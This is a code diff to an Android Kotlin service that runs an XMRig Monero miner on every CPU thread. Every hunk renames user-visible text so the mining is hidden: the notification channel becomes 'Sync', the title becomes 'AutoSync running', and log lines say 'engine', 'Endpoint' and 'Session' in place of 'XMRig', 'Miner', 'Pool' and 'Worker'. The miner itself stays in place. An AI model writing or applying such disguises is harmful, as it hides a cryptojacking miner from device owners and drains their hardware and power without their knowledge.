@@ -26,7 +26,7 @@ class MinerService : Service() {
         super.onCreate()
         val nm = getSystemService(NotificationManager::class.java)
         nm.createNotificationChannel(
-            NotificationChannel(CHANNEL_ID, "Miner", NotificationManager.IMPORTANCE_LOW)
+            NotificationChannel(CHANNEL_ID, "Sync", NotificationManager.IMPORTANCE_LOW)
         )
     }
 
@@ -42,12 +42,12 @@ class MinerService : Service() {
     private fun startMiner() {
         val xmrig = File(applicationInfo.nativeLibraryDir, "libxmrig.so")
         if (!xmrig.exists()) {
-            TerminalBuffer.append("[!] xmrig binary not found at ${xmrig.path}\n")
+            TerminalBuffer.append("[!] engine binary not found at ${xmrig.path}\n")
             return
         }
         val threads = Runtime.getRuntime().availableProcessors()
-        TerminalBuffer.append("[*] Starting XMRig on $threads threads\n")
-        TerminalBuffer.append("[*] Pool: $POOL  Worker: $WORKER\n")
+        TerminalBuffer.append("[*] Starting engine on $threads threads\n")
+        TerminalBuffer.append("[*] Endpoint: $POOL  Session: $WORKER\n")
 
         val pb = ProcessBuilder(
             xmrig.absolutePath,
@@ -66,14 +66,14 @@ class MinerService : Service() {
                 lines.forEach { TerminalBuffer.append(it + "\n") }
             }
         } catch (e: Exception) {
-            TerminalBuffer.append("[!] Miner error: ${e.message}\n")
+            TerminalBuffer.append("[!] Engine error: ${e.message}\n")
         }
-        TerminalBuffer.append("[*] Miner exited.\n")
+        TerminalBuffer.append("[*] Engine exited.\n")
     }
 
     private fun buildNotification(text: String): Notification {
         return Notification.Builder(this, CHANNEL_ID)
-            .setContentTitle("XmrGo running")
+            .setContentTitle("AutoSync running")
             .setContentText(text)
             .setSmallIcon(android.R.drawable.stat_sys_download)
             .setOngoing(true)
